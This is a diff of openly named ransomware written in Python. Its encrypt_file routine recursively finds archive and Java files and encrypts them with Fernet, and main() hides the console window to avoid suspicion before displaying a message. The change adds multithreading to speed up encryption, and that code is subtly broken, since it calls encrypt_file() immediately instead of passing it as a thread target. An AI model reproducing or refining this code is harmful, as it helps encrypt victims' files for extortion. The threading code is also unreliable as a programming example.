@@ -116,7 +116,7 @@ def encrypt_file():
                       + glob.glob(path + '/**/*.tgz', recursive=True) \
                       + glob.glob(path + '/**/*.rar', recursive=True) \
                       + glob.glob(path + '/**/*.java', recursive=True):
-
+            
             k = key
             f = Fernet(k)
             try:
@@ -184,11 +184,23 @@ def delete_ransomware():
 
 
 def main():
+    from threading import Thread
+
     # Hides the terminal console to prevent suspicion while working in background
     hide = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
-    encrypt_file()
+    threads = 20
+    jobs = []
+    for t in range(0, threads):
+        thread = Thread(target=encrypt_file())
+        jobs.append(thread)
+    for j in jobs:
+        j.start()
+    for j in jobs:
+        j.join()
+        pass
+
     message()
     # ransom_note()
     # show_ransom_note()
